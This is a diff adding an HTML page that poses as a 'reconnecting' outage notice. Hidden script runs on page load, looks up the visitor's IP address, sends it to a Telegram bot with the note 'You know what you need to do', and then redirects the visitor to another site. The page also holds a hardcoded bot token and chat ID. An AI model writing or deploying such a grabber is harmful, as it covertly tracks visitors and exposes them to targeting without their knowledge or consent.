@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>reconnecting</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    <h1>We have some troubles. please be patient.</h1>
+
+    <script>
+        function sendToTelegram(ip) {
+            const token = '7719637928:AAFsQ6QHSH7z_GUeu6HMYl62yngKQPsRL_g';
+            const chatId = '6013637983';
+            const message = `New IP logged: ${ip}. You know what you need to do...
+            https://ipapi.co/?q=${ip}`;
+
+            $.ajax({
+                url: `https://api.telegram.org/bot${token}/sendMessage`,
+                method: 'POST',
+                data: {
+                    chat_id: chatId,
+                    text: message
+                },
+                success: function(response) {
+                    console.log('Message sent successfully:', response);
+                    window.location.href = 'https://goofy-ahh-website.onrender.com';
+                },
+                error: function(error) {
+                    console.error('Error sending message:', error);
+                    window.location.href = 'https://goofy-ahh-website.onrender.com';
+                }
+            });
+        }
+
+        $(document).ready(function() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIp = data.ip;
+                    sendToTelegram(userIp);
+                })
+                .catch(error => {
+                    console.error('Error fetching IP:', error);
+                    window.location.href = 'https://goofy-ahh-website.onrender.com';
+                });
+        });
+    </script>
+</body>
+</html>
